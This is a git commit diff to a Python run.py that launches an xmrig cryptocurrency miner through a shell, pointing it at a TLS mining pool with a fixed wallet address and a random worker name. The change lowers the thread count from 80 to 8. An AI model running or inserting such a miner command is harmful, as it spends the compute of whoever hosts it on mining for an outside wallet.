681d5cdaaf4c747cbf8a63e9f6e444f7db97a78e
tarikgumus <tarik.gumus@yahoo.com>
2022-09-19 01:43:24 +0800

    Update run.py

--- run.py
+++ run.py
@@ -5,7 +5,7 @@ import math
 
 try:
     me = singleton.SingleInstance()
-    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-eu.rplant.xyz:17084 --tls --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 80 -k", stdout=subprocess.PIPE, shell=True)
+    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-eu.rplant.xyz:17084 --tls --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
 except:
     print("Already running")
     sys.exit(-1)
